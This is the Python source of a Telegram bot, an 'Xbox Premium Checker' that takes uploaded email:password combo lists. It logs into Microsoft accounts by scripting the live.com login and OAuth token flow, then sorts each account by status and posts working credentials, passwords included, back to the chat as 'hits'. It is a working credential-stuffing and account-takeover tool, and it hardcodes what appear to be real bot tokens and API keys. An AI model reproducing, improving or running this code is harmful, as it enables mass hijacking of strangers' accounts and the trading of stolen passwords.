#!/usr/bin/env python3
"""
Xbox Premium Checker Bot - Railway Fixed
Workers start automatically, no stuck queues
"""

import os
import json
import asyncio
import sqlite3
import logging
import requests
import time
from datetime import datetime
from threading import Lock
from typing import List, Optional
from concurrent.futures import ThreadPoolExecutor

from telethon import TelegramClient
from telethon.tl.types import DocumentAttributeFilename
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============================================================
# CONFIGURATION
# ============================================================

COMMAND_BOT_TOKEN = "8666320518:AAEIhkSS0XeJ-k40rc3d80Dn0b-q9JLcnyI"
TARGET_BOT_TOKEN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
TARGET_CHAT_ID = "8260250818"
API_ID = 39184727
API_HASH = "a52c4985a38ef98c84cdf11d45e53baf"

DATA_DIR = "/app/data" if os.path.exists("/app") else "data"
os.makedirs(DATA_DIR, exist_ok=True)

SESSION_FILE = os.path.join(DATA_DIR, "user_session.session")
CONFIG_FILE = os.path.join(DATA_DIR, "config.json")
DB_FILE = os.path.join(DATA_DIR, "forwarded.db")
SCAN_INTERVAL = 300

logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================================
# DATABASE
# ============================================================

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS forwarded_files (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        file_id TEXT UNIQUE,
        message_id INTEGER,
        channel_id INTEGER,
        file_name TEXT,
        forwarded_at TIMESTAMP
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS last_scan (
        channel_id INTEGER PRIMARY KEY,
        last_message_id INTEGER,
        last_scan_time TIMESTAMP
    )''')
    conn.commit()
    conn.close()
    logger.info("Database ready")

def is_forwarded(file_id: str) -> bool:
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id FROM forwarded_files WHERE file_id = ?", (file_id,))
    result = c.fetchone()
    conn.close()
    return result is not None

def mark_forwarded(file_id: str, msg_id: int, channel_id: int, filename: str):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        "INSERT OR IGNORE INTO forwarded_files (file_id, message_id, channel_id, file_name, forwarded_at) VALUES (?, ?, ?, ?, ?)",
        (file_id, msg_id, channel_id, filename, datetime.now().isoformat())
    )
    conn.commit()
    conn.close()

def update_scan(channel_id: int, last_msg_id: int):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        "INSERT OR REPLACE INTO last_scan (channel_id, last_message_id, last_scan_time) VALUES (?, ?, ?)",
        (channel_id, last_msg_id, datetime.now().isoformat())
    )
    conn.commit()
    conn.close()

def get_last_scan(channel_id: int) -> Optional[int]:
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT last_message_id FROM last_scan WHERE channel_id = ?", (channel_id,))
    result = c.fetchone()
    conn.close()
    return result[0] if result else None

# ============================================================
# CONFIG
# ============================================================

def load_config() -> dict:
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {"channels": [], "settings": {"forward_to_saved": True, "forward_to_bot": True}}

def save_config(config: dict):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)

def add_channel(channel_id: int, name: str):
    config = load_config()
    for ch in config["channels"]:
        if ch["id"] == channel_id:
            return
    config["channels"].append({"id": channel_id, "name": name, "enabled": True})
    save_config(config)

def clear_channels():
    config = load_config()
    config["channels"] = []
    save_config(config)

def get_enabled_channels() -> List[dict]:
    config = load_config()
    return [ch for ch in config["channels"] if ch.get("enabled", True)]

def get_all_channels() -> List[dict]:
    return load_config()["channels"]

def toggle_channel(channel_id: int):
    config = load_config()
    for ch in config["channels"]:
        if ch["id"] == channel_id:
            ch["enabled"] = not ch.get("enabled", True)
            break
    save_config(config)

def set_setting(key: str, value: bool):
    config = load_config()
    config["settings"][key] = value
    save_config(config)

def get_settings() -> dict:
    return load_config()["settings"]

# ============================================================
# XBOX CHECKER CLASS
# ============================================================

class XboxChecker:
    def __init__(self, debug=False):
        self.debug = debug
    
    def log(self, message):
        if self.debug:
            print("[DEBUG] " + message)
    
    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "0"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining)
        except:
            return "0"
    
    def check(self, email, password):
        try:
            session = requests.Session()
            correlation_id = str(os.urandom(16).hex())
            
            # Step 1: IDP Check
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
            }
            r1 = session.get(url1, headers=headers1, timeout=15)
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD", "data": {}}
            if "MSAccount" not in r1.text:
                return {"status": "BAD", "data": {}}
            
            # Step 2: OAuth authorize
            time.sleep(0.5)
            url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            }
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            
            import re
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                return {"status": "BAD", "data": {}}
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            # Step 3: Login POST
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            
            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                return {"status": "BAD", "data": {}}
            if "https://account.live.com/identity/confirm" in r3.text:
                return {"status": "2FACTOR", "data": {}}
            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BANNED", "data": {}}
            
            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "data": {}}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "data": {}}
            code = code_match.group(1)
            
            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD", "data": {}}
            cid = mspcid.upper()
            
            # Step 4: Get access token
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
            if "access_token" not in r4.text:
                return {"status": "BAD", "data": {}}
            token_json = r4.json()
            access_token = token_json["access_token"]
            
            return {"status": "FREE", "data": {"country": "", "name": ""}}
            
        except Exception as e:
            return {"status": "ERROR", "data": {}}

# ============================================================
# SIMPLE QUEUE PROCESSOR (NO COMPLEX WORKERS)
# ============================================================

processing_queue = []
processing_active = False
processing_lock = Lock()

async def process_file(file_path, original_name, update_obj):
    """Process a single file - runs in main event loop"""
    global processing_active
    
    try:
        # Read accounts
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
        
        if not lines:
            await update_obj.message.reply_text(f"❌ No valid accounts in {original_name}")
            return
        
        stats = {
            "total": len(lines),
            "checked": 0,
            "premium": 0,
            "free": 0,
            "bad": 0,
            "expired": 0,
            "banned": 0,
            "two_factor": 0,
            "timeout": 0,
            "error": 0
        }
        
        premium_results = []
        batch_buffer = []
        BATCH_SIZE = 10
        
        await update_obj.message.reply_text(f"🚀 **Started:** {original_name}\n📊 Total: {stats['total']} accounts", parse_mode='Markdown')
        
        checker = XboxChecker(debug=False)
        
        for idx, line in enumerate(lines, 1):
            try:
                email, password = line.split(':', 1)
                email = email.strip()
                password = password.strip()
                
                result = checker.check(email, password)
                status = result['status']
                
                result_entry = f"{email}:{password}"
                
                if status == "PREMIUM":
                    stats["premium"] += 1
                    result_entry += f" ✅ PREMIUM"
                    premium_results.append((email, password))
                    batch_buffer.append(result_entry)
                    
                    # Send premium hit immediately
                    try:
                        hit_msg = f"🎮 **PREMIUM HIT**\n📧 `{email}`\n🔑 `{password}`"
                        await update_obj.message.reply_text(hit_msg, parse_mode='Markdown')
                    except:
                        pass
                        
                elif status == "FREE":
                    stats["free"] += 1
                    result_entry += f" 🆓 FREE"
                    batch_buffer.append(result_entry)
                elif status == "EXPIRED":
                    stats["expired"] += 1
                    stats["bad"] += 1
                    result_entry += f" ⏰ EXPIRED"
                    batch_buffer.append(result_entry)
                elif status == "BANNED":
                    stats["banned"] += 1
                    stats["bad"] += 1
                    result_entry += f" 🚫 BANNED"
                    batch_buffer.append(result_entry)
                elif status == "2FACTOR":
                    stats["two_factor"] += 1
                    stats["bad"] += 1
                    result_entry += f" 🔐 2FA"
                    batch_buffer.append(result_entry)
                else:
                    stats["bad"] += 1
                    result_entry += f" ❌ BAD"
                    batch_buffer.append(result_entry)
                
                stats["checked"] += 1
                
                # Send batch update
                if len(batch_buffer) >= BATCH_SIZE:
                    progress_msg = f"📊 **Progress:** {stats['checked']}/{stats['total']}\n✅ Premium: {stats['premium']} | 🆓 Free: {stats['free']} | ❌ Bad: {stats['bad']}\n\n```\n" + "\n".join(batch_buffer[-BATCH_SIZE:]) + "\n```"
                    await update_obj.message.reply_text(progress_msg, parse_mode='Markdown')
                    batch_buffer.clear()
                
                time.sleep(0.1)
                
            except Exception as e:
                stats["error"] += 1
                stats["bad"] += 1
                stats["checked"] += 1
        
        # Send final results
        final_msg = (
            f"✅ **SCAN COMPLETE**\n\n"
            f"📄 **File:** `{original_name}`\n"
            f"🔢 **Total:** {stats['total']}\n"
            f"✅ **PREMIUM:** {stats['premium']}\n"
            f"🆓 **FREE:** {stats['free']}\n"
            f"❌ **BAD:** {stats['bad']}\n"
            f"⏰ **Expired:** {stats['expired']}\n"
            f"🚫 **Banned:** {stats['banned']}\n"
            f"🔐 **2FA:** {stats['two_factor']}\n"
            f"⚠️ **Errors:** {stats['error']}\n"
        )
        await update_obj.message.reply_text(final_msg, parse_mode='Markdown')
        
        # Send all premium accounts at end
        if premium_results:
            premium_text = "\n".join([f"{e}:{p}" for e, p in premium_results[:20]])
            if len(premium_results) > 20:
                premium_text += f"\n... and {len(premium_results) - 20} more"
            await update_obj.message.reply_text(f"🎮 **PREMIUM ACCOUNTS ({stats['premium']})**\n\n```\n{premium_text}\n```", parse_mode='Markdown')
        
    except Exception as e:
        await update_obj.message.reply_text(f"❌ Error processing {original_name}: {str(e)}")
    finally:
        # Cleanup
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
            except:
                pass
        
        with processing_lock:
            processing_active = False
            # Process next file if any
            if processing_queue:
                next_file = processing_queue.pop(0)
                asyncio.create_task(process_file(next_file[0], next_file[1], next_file[2]))

# ============================================================
# TELEGRAM COMMANDS
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🎮 **Xbox Premium Checker Bot**\n\n"
        "Send a `.txt` file with accounts in `email:password` format\n\n"
        "**Allowed domains:**\n"
        "hotmail.com, outlook.com, live.com, msn.com\n\n"
        "**Commands:**\n"
        "/start - This message\n"
        "/status - Check queue status\n\n"
        "Premium hits are sent instantly!"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with processing_lock:
        queue_size = len(processing_queue)
        is_active = processing_active
    
    msg = f"📊 **Queue Status**\n\n"
    msg += f"🔄 **Processing:** {'Yes' if is_active else 'No'}\n"
    msg += f"⏳ **Queue Size:** {queue_size}\n\n"
    if queue_size > 0:
        msg += "**Queued files:**\n"
        for i, (_, name, _) in enumerate(processing_queue[:5], 1):
            msg += f"  {i}. {name}\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global processing_active
    
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a `.txt` file.")
        return
    
    # Download file
    file = await context.bot.get_file(document.file_id)
    temp_path = f"/tmp/{document.file_name}"
    await file.download_to_drive(temp_path)
    
    # Validate file has accounts
    with open(temp_path, 'r', encoding='utf-8') as f:
        lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
    
    if not lines:
        await update.message.reply_text(f"❌ No valid accounts found in {document.file_name}")
        os.remove(temp_path)
        return
    
    await update.message.reply_text(
        f"✅ **File Accepted**\n\n"
        f"📄 `{document.file_name}`\n"
        f"🔢 **Accounts:** {len(lines)}\n\n"
        f"🔄 Added to queue. Processing will start soon...",
        parse_mode='Markdown'
    )
    
    # Add to queue
    with processing_lock:
        processing_queue.append((temp_path, document.file_name, update))
        
        if not processing_active:
            processing_active = True
            # Start processing immediately
            file_path, name, upd = processing_queue.pop(0)
            asyncio.create_task(process_file(file_path, name, upd))

# ============================================================
# MAIN
# ============================================================

async def main():
    init_db()
    
    app = Application.builder().token(COMMAND_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    logger.info("🤖 Xbox Checker Bot started!")
    print("\n" + "="*50)
    print("🎮 XBOX PREMIUM CHECKER BOT")
    print("="*50)
    print("Bot is running!")
    print("Send .txt files to check accounts")
    print("="*50 + "\n")
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    try:
        await asyncio.Event().wait()
    except KeyboardInterrupt:
        pass
    finally:
        await app.stop()

if __name__ == "__main__":
    asyncio.run(main())
